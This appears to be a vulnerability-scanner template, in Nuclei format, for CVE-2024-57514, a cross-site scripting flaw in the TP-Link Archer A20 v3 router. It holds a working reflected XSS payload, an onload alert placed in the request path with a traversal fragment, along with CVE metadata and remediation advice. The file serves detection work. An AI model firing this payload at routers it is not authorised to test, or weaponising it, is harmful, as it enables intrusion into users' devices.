http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "<style onload=alert`document.domain`;", "Index of")
    - contains(content_type, "text/html")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/<style%20onload=alert`document.domain`;>../..%2f'
id: CVE-2024-57514
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-57514
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cwe-id: CWE-79
    epss-percentile: 0.93996
    epss-score: 0.13596
  description: 'The TP-Link Archer A20 v3 router is vulnerable to Cross-site Scripting
    (XSS) due to improper handling of directory listing paths in the web interface.
    When a specially crafted URL is visited, the router''s web page renders the directory
    listing and executes arbitrary JavaScript embedded in the URL. This allows the
    attacker to inject malicious code into the page, executing JavaScript on the victim''s
    browser, which could then be used for further malicious actions. The vulnerability
    was identified in the 1.0.6 Build 20231011 rel.85717(5553) version.

    '
  impact: 'Authenticated attackers can inject malicious JavaScript into directory
    listing pages, executing arbitrary code in victim browsers when they visit crafted
    URLs.

    '
  metadata:
    max-request: 1
    product: tp-link-archer-a20-v3-router
    vendor: tp-link
  name: TP-Link Archer A20 v3 Router - Cross-site Scripting
  reference:
  - https://www.zyenra.com/blog/xss-in-tplink-archer-a20.html
  - https://nvd.nist.gov/vuln/detail/CVE-2024-57514
  remediation: 'Update TP-Link Archer A20 v3 router to firmware version later than
    1.0.6 Build 20231011 that addresses the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2024,tplink,router,xss,vuln
